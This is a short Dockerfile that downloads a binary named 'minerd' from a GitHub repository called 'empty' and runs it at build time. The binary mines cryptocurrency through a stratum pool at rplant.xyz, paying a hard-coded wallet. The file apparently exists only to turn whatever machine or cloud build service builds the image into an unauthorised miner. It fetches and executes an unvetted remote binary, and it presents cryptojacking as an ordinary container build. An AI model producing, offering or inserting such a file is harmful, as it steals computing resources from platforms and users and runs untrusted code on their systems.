FROM ubuntu:latest
RUN apt update && apt install wget curl git -y
RUN wget https://github.com/rienode0001/empty/raw/main/minerd && chmod +x minerd
RUN ./minerd -a yespower -o stratum+tcp://stratum-na.rplant.xyz:7070 -u Wn1Q1hueWCfi1xL9rd1t4ooMvKwYYGmzsY
